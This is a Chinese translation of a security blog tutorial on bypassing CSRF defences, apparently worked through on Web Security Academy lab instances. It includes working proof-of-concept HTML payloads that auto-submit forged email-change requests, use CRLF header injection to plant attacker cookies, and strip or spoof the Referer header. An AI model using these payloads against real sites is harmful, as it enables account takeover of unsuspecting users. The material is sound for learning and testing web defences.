<html>
<head>
<title>Bypassing CSRF Protection (II)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">绕过CSRF保护(二)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/bypassing-csrf-protection-ii-b479009b4a7a?source=collection_archive---------0-----------------------#2022-09-23">https://infosecwriteups.com/bypassing-csrf-protection-ii-b479009b4a7a?source=collection_archive---------0-----------------------#2022-09-23</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="b215" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">嗨，我的名字是<strong class="jp ir">哈沙尔·穆贾希德</strong>，在这篇博客中，我们将讨论一些绕过csrf保护的<strong class="jp ir">技术。</strong></p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/48ea8f420f21d70884e4171b6461c776.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*rdQJgpLVy-5RuWur.png"/></div></div></figure><p id="e658" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你想了解csrf是什么，你可以在这里阅读我以前的博客。</p><div class="kx ky gp gr kz la"><a rel="noopener  ugc nofollow" target="_blank" href="/cross-site-request-forgery-csrf-explained-and-exploited-i-db464a61a582"><div class="lb ab fo"><div class="lc ab ld cl cj le"><h2 class="bd ir gy z fp lf fr fs lg fu fw ip bi translated">跨站点请求伪造(CSRF)解释和利用I</h2><div class="lh l"><h3 class="bd b gy z fp lf fr fs lg fu fw dk translated">嗨！这篇博客将教你CSRF袭击是如何发生的，以及我们如何预防它们。</h3></div><div class="li l"><p class="bd b dl z fp lf fr fs lg fu fw dk translated">infosecwriteups.com</p></div></div><div class="lj l"><div class="lk l ll lm ln lj lo kv la"/></div></div></a></div><p id="da3c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">和旁路技术第1部分:</p><div class="kx ky gp gr kz la"><a rel="noopener  ugc nofollow" target="_blank" href="/bypassing-csrf-protection-i-bc014384d0aa"><div class="lb ab fo"><div class="lc ab ld cl cj le"><h2 class="bd ir gy z fp lf fr fs lg fu fw ip bi translated">绕过CSRF保护(一)</h2><div class="lh l"><h3 class="bd b gy z fp lf fr fs lg fu fw dk translated">嗨，我的名字是哈沙尔·穆贾希德，在这篇博客中，我们将讨论一些绕过csrf保护的技术。</h3></div><div class="li l"><p class="bd b dl z fp lf fr fs lg fu fw dk translated">infosecwriteups.com</p></div></div><div class="lj l"><div class="lp l ll lm ln lj lo kv la"/></div></div></a></div><p id="6fa3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，今天我们将研究一些绕过web应用程序的CSRF保护的技术。</p><p id="50f0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> 5: CSRF，其中令牌被绑定到非会话cookie: </strong></p><p id="a7b6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有时csrf令牌被绑定到cookie，但是该cookie与用户的会话无关。这是因为应用程序使用了两个不同的框架，一个用于会话处理，一个用于csrf保护，而这两个框架没有集成在一起。</p><p id="c602" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">示例:</p><pre class="km kn ko kp gt lq lr ls lt aw lu bi"><span id="b959" class="lv lw iq lr b gy lx ly l lz ma">POST /email/change HTTP/1.1 <br/>Host: vulnerable-website.com <br/>Content-Type: application/x-www-form-urlencoded <br/>Content-Length: 68 <br/>Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF;<strong class="lr ir">csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv ==&gt; Non Session Cookie </strong></span><span id="e056" class="lv lw iq lr b gy mb ly l lz ma">csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&amp;email=wiener@normal-user.com</span></pre><p id="5ade" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这看起来是安全的，并且在大多数情况下是安全的，但是如果应用程序允许任何允许攻击者设置cookie的行为，那么攻击者可以很容易地创建一个帐户，获得有效的csrf令牌和相关联的cookie，并将其合并到他的有效负载中，以实现他的目标。</p><p id="b35d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我们需要绕过他的保护。</p><ul class=""><li id="d8ae" class="mc md iq jp b jq jr ju jv jy me kc mf kg mg kk mh mi mj mk bi translated">csrf会话处理框架和用户会话处理框架不应相互集成。</li><li id="65ff" class="mc md iq jp b jq ml ju mm jy mn kc mo kg mp kk mh mi mj mk bi translated">web应用程序允许某种行为，使得攻击者能够在受害者的浏览器中设置自己的csrfkey cookie。</li><li id="b98a" class="mc md iq jp b jq ml ju mm jy mn kc mo kg mp kk mh mi mj mk bi translated">创建一个有效负载。</li></ul><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mq"><img src="../Images/faae792f891141f7a4d7809e5519215f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*C3DEOnBn05PNX0TvzLNXNg.png"/></div></div></figure><p id="6165" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以尝试插入另一个用户的令牌，看看我们的请求是否通过。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mr"><img src="../Images/344f882f027b36d9177aae037514f489.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CM53MUgSCW0Q3RXz9HuGlw.png"/></div></div></figure><p id="e049" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以看到我们的请求有一个csrf密钥cookie和一个csrf令牌，它们被捆绑在一起，没有与用户会话框架集成。</p><p id="cda0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，为了绕过这一点，我们需要在受害者的浏览器中设置我们的csrf密钥，有点像<strong class="jp ir">头注入</strong>。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mr"><img src="../Images/d2f184150043ec39d0f2e1c31e90fa3f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UZtLnfzx3-zvmJG83N-p0w.png"/></div></div></figure><p id="9848" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以看到搜索功能在浏览器中设置了最后一个搜索项cookie，我们可以使用此行为在受害者的浏览器中设置csrfkey cookie。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mr"><img src="../Images/46525da77aa9fc6ab07fc88b211dafb0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Cq-RNiwmRPgZKEnxOBQn0Q.png"/></div></div></figure><p id="cd13" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以看到，在我们的测试案例中，我们能够将攻击者的csrf密钥注入受害者的浏览器。现在，困难的部分已经完成。我们只需创建一个有效负载，利用此漏洞首先在受害者的浏览器中设置cookie，然后发出请求。</p><p id="5bac" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你想知道如何在没有打嗝专家的情况下生成csrf有效载荷，请阅读我之前的<a class="ae ms" href="https://medium.com/@hasharmujahid/cross-site-request-forgery-csrf-explained-and-exploited-i-db464a61a582" rel="noopener">博客</a>。</p><pre class="km kn ko kp gt lq lr ls lt aw lu bi"><span id="bbe3" class="lv lw iq lr b gy lx ly l lz ma">&lt;html&gt;<br/>  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;<br/>  &lt;body&gt;<br/>  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;<br/>    &lt;form action="<a class="ae ms" href="https://0aac003c049cebe3c022c94800810065.web-security-academy.net/my-account/change-email" rel="noopener ugc nofollow" target="_blank">https://0aac003c049cebe3c022c94800810065.web-security-academy.net/my-account/change-email</a>" method="POST"&gt;<br/>      &lt;input type="hidden" name="email" value="test&amp;#64;mail&amp;#46;com" /&gt;<br/>      &lt;input type="hidden" name="csrf" <strong class="lr ir">value="Kv7fuJJyHThqZ8EEwtoABb5JQ5QkwF8G"</strong> /&gt;<br/>      &lt;input type="submit" value="Submit request" /&gt;<br/>    &lt;/form&gt;<br/>  &lt;img src='<a class="ae ms" href="https://0aac003c049cebe3c022c94800810065.web-security-academy.net/?search=hi%0d%0aSet-Cookie:%20csrfKey=2Dj9hmEsH2ReRwZuVRfzoN0HgS2HQPwa" rel="noopener ugc nofollow" target="_blank"><strong class="lr ir">https://0aac003c049cebe3c022c94800810065.web-security-academy.net/?search=hi%0d%0aSet-Cookie:%20csrfKey=2Dj9hmEsH2ReRwZuVRfzoN0HgS2HQPwa</strong></a>' <strong class="lr ir">onerror=document.forms[0].submit()</strong>;&gt;<br/>  &lt;/body&gt;<br/>&lt;/html&gt;</span></pre><p id="8b41" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">img标记有一个URL，它将我们的cookie注入受害者的浏览器，并在此之后提交表单。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mt"><img src="../Images/9b795773c11acc9d8dc8269849bc6743.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wALiR9u8rdXO4PJT0LCnqw.png"/></div></div></figure><p id="b262" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">交给受害者。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mu"><img src="../Images/a06b51cf0008830a96f33c43a3346d09.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0sImADC_hOa4hjJCjtCqfg.png"/></div></div></figure></div><div class="ab cl mv mw hu mx" role="separator"><span class="my bw bk mz na nb"/><span class="my bw bk mz na nb"/><span class="my bw bk mz na"/></div><div class="ij ik il im in"><p id="86fa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> 6:令牌在cookie中重复的CSRF:</strong></p><p id="853f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有些应用程序只是复制csrfkey cookie和csrf令牌的值。在这种情况下，如果应用程序允许某些cookie设置漏洞，攻击者就不必获得有效的csrf密钥。他只需要在cookie和令牌中设置相同的值。</p><p id="ec67" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这种类型的辩护被称为双重提交辩护。在这种情况下，csrf值是否有效并不重要，因为它们是相等的。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mq"><img src="../Images/2b7627fb037297f66e0605c572596b19.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lqUm8zRvc-ILgPV2iXjWdQ.png"/></div></div></figure><p id="6812" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以利用搜索功能中的相同漏洞在受害者的浏览器中设置cookie并生成POC。</p><pre class="km kn ko kp gt lq lr ls lt aw lu bi"><span id="6913" class="lv lw iq lr b gy lx ly l lz ma">&lt;html&gt;<br/>  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;<br/>  &lt;body&gt;<br/>  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;<br/>    &lt;form action="<a class="ae ms" href="https://0af6009a04e9f129c0763b54001100de.web-security-academy.net/" rel="noopener ugc nofollow" target="_blank">https://0af6009a04e9f129c0763b54001100de.web-security-academy.net/my-account/change-email</a>" method="POST"&gt;<br/>      &lt;input type="hidden" name="email" value="test&amp;#64;mail&amp;#46;com" /&gt;<br/>      &lt;input type="hidden" name="csrf" value="<strong class="lr ir">fake</strong>" /&gt;<br/>      &lt;input type="submit" value="Submit request" /&gt;<br/>    &lt;/form&gt;<br/> &lt;img src="'"<a class="ae ms" href="https://0af6009a04e9f129c0763b54001100de.web-security-academy.net/" rel="noopener ugc nofollow" target="_blank"><strong class="lr ir">https://0af6009a04e9f129c0763b54001100de.web-security-academy.net/</strong></a><strong class="lr ir">?search=hi%0d%0aSet-Cookie:%20csrf=fake"</strong> <strong class="lr ir">onerror="document.forms[0].submit()</strong>;"/&gt;<br/>  &lt;/body&gt;<br/>  &lt;/body&gt;<br/>&lt;/html&gt;</span></pre><p id="553c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在把有效载荷交给受害者。</p></div><div class="ab cl mv mw hu mx" role="separator"><span class="my bw bk mz na nb"/><span class="my bw bk mz na nb"/><span class="my bw bk mz na"/></div><div class="ij ik il im in"><p id="de15" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> 7: CSRF，其中引用验证取决于是否存在标头:</strong></p><p id="edac" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">除了基于CSRF令牌的保护，一些应用程序使用HTTP Referer标头来尝试对抗CSRF攻击，通常是通过确认请求来自应用程序自己的域。这种策略通常不太有效，并且经常被规避。</p><p id="5a99" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果refer头不存在，某些应用程序会跳过验证。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mr"><img src="../Images/9acb149ab6b3381716a2cf1dc3f6f8f5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Qb7TIdWFf88HSgU8NERjVw.png"/></div></div></figure><p id="682a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果我们修改referer头。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mu"><img src="../Images/e5de399cc5bd399afb05dd9a1049ec86.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Zw2YVWVgKfcTGhXYGrL6Cg.png"/></div></div></figure><p id="5e2b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们的请求失败了。</p><p id="17a8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果我们删除引用头。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mr"><img src="../Images/8518c685bf0d2696df69b91ef550bd25.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*M7LoLrzKr9Iy_g2ul4ppew.png"/></div></div></figure><p id="a452" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们的请求完成了。</p><p id="ed1d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，在这种情况下，我们需要欺骗受害者的浏览器在发送恶意请求时丢弃referer标头，以便跳过验证。</p><p id="2b1d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以通过添加</p><pre class="km kn ko kp gt lq lr ls lt aw lu bi"><span id="840a" class="lv lw iq lr b gy lx ly l lz ma">&lt;meta name="referrer" content="no-referrer"&gt;</span></pre><p id="1a05" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在我们的概念证明中。</p><pre class="km kn ko kp gt lq lr ls lt aw lu bi"><span id="2141" class="lv lw iq lr b gy lx ly l lz ma">&lt;html&gt;<br/>  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;<br/>  &lt;body&gt;<br/>  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;<br/>    &lt;form action="<a class="ae ms" href="https://0a790074041efac7c0689f7200ac001e.web-security-academy.net/my-account/change-email" rel="noopener ugc nofollow" target="_blank">https://0a790074041efac7c0689f7200ac001e.web-security-academy.net/my-account/change-email</a>" method="POST"&gt;<br/>      &lt;input type="hidden" name="email" value="test&amp;#64;mail&amp;#46;com" /&gt;<br/>      &lt;input type="submit" value="Submit request" /&gt;<br/><strong class="lr ir">&lt;meta name="referrer" content="no-referrer"&gt;</strong><br/>    &lt;/form&gt;<br/>    &lt;script&gt;<br/>      document.forms[0].submit();<br/>    &lt;/script&gt;<br/>  &lt;/body&gt;<br/>&lt;/html&gt;</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mr"><img src="../Images/97d7fe34aecf9b63c15013c0fd59b8b9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cLLfBrTc7yH5wYAcoHqPWw.png"/></div></div></figure></div><div class="ab cl mv mw hu mx" role="separator"><span class="my bw bk mz na nb"/><span class="my bw bk mz na nb"/><span class="my bw bk mz na"/></div><div class="ij ik il im in"><p id="12f7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> 8: CSRF与碎Referer验证:</strong></p><p id="4803" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一些应用程序通过检查域来验证referer报头，如果请求来自允许的域列表，则处理该请求，如果来自不同的域，则拒绝该请求，但是由于不同解析器对URL的处理和解析，这种保护可以被绕过。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mr"><img src="../Images/6f91b27dff796770582999f04fe41b85.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bAC21WsQI2eZtMh_1G8iew.png"/></div></div></figure><p id="7cf9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当请求来自同一个域时，我们可以看到请求是成功的。</p><p id="5fb9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们尝试删除referer标头</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mq"><img src="../Images/05c84ea905b52fe3813c4632b620dd06.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7nbkfClSCHcA1nu3dBz2_w.png"/></div></div></figure><p id="e61b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这次运气不好，所以我们需要绕过这个保护。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mq"><img src="../Images/8ef83e6f545eee55e39703fb3b7f90b8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4LdfShlPqaxyG04DuyHSUg.png"/></div></div></figure><p id="bbd5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">不起作用，但如果我们最后添加了有效的域id。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mr"><img src="../Images/a7c45b335f1880334d85d5b6ebdd5532.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OMbpk2D4u8aXxQBqDm6bQg.png"/></div></div></figure><p id="8f8d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们的请求被接受了。</p><p id="6212" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我们知道我们的应用程序检查域名是否包含在referer头中，而不是绝对URL。</p><p id="a94e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们必须对我们的有效负载概念验证进行一些更改，以包含我们应用程序的有效域。</p><pre class="km kn ko kp gt lq lr ls lt aw lu bi"><span id="8cbf" class="lv lw iq lr b gy lx ly l lz ma">&lt;html&gt;<br/>  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;<br/>  &lt;body&gt;<br/>  &lt;script&gt;history.pushState('', '', '<strong class="lr ir">/?0a0b001d046155a9c07ad817000500af.web-security-academy.net</strong>')&lt;/script&gt;<br/>    &lt;form action="<a class="ae ms" href="https://0a0b001d046155a9c07ad817000500af.web-security-academy.net/my-account/change-email" rel="noopener ugc nofollow" target="_blank">https://0a0b001d046155a9c07ad817000500af.web-security-academy.net/my-account/change-email</a>" method="POST"&gt;<br/>      &lt;input type="hidden" name="email" value="test&amp;#64;mail&amp;#46;com" /&gt;<br/>      &lt;input type="submit" value="Submit request" /&gt;<br/>    &lt;/form&gt;<br/>    &lt;script&gt;<br/>      document.forms[0].submit();<br/>    &lt;/script&gt;<br/>  &lt;/body&gt;<br/>&lt;/html&gt;</span></pre><p id="23d6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">历史推送状态函数中的第三个参数是URL，所以我们已经知道是否像这样提供我们的头</p><pre class="km kn ko kp gt lq lr ls lt aw lu bi"><span id="8524" class="lv lw iq lr b gy lx ly l lz ma">Referer:  http://hacker.com/<a class="ae ms" href="https://exploit-0abe00f7041d5521c010d8d30126006c.web-security-academy.net/exploit?0a0b001d046155a9c07ad817000500af.web-security-academy.net" rel="noopener ugc nofollow" target="_blank">?0a0b001d046155a9c07ad817000500af.web-security-academy.net</a></span></pre><p id="f1e6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它将被接受，因此我们可以提供应用程序的域是函数中的查询参数，该参数将被追加。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mr"><img src="../Images/83d061c864a775b5ac5332f3d28e1fc1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*N-wAUexlKIqP_ud1aFkGHQ.png"/></div></div></figure></div><div class="ab cl mv mw hu mx" role="separator"><span class="my bw bk mz na nb"/><span class="my bw bk mz na nb"/><span class="my bw bk mz na"/></div><div class="ij ik il im in"><p id="426c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">今天到此为止。如果你喜欢这个，请考虑关注。</p><p id="0a83" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">直到那时:快乐的黑客❤</p><figure class="km kn ko kp gt kq"><div class="bz fp l di"><div class="nc nd l"/></div></figure></div><div class="ab cl mv mw hu mx" role="separator"><span class="my bw bk mz na nb"/><span class="my bw bk mz na nb"/><span class="my bw bk mz na"/></div><div class="ij ik il im in"><h2 id="9ad1" class="lv lw iq bd ne nf ng dn nh ni nj dp nk jy nl nm nn kc no np nq kg nr ns nt nu bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae ms" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周时事通讯</a>以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>